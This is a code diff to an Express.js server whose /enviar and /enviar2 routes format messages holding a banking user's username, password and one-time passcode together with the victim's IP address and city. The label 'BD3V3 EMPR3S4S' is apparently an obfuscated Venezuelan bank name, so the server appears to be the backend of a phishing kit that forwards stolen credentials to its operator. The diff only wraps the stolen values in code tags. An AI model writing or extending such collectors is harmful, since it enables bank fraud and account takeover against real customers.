@@ -46,12 +46,12 @@ app.post('/enviar', async (req, res) => {
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
   const ciudad = await obtenerCiudad(ip);
 
-  const mensaje = `
+ const mensaje = `
 ❤️BD3V3 EMPR3S4S❤️
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clav}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clav}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -92,10 +92,10 @@ app.post('/enviar2', async (req, res) => {
 🔐❤️BD3V3 EMPR3S4S❤️
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clav}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clav}</code>
 
-🔑 OTP: ${otp}
+🔑 OTP: <code>${otp}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
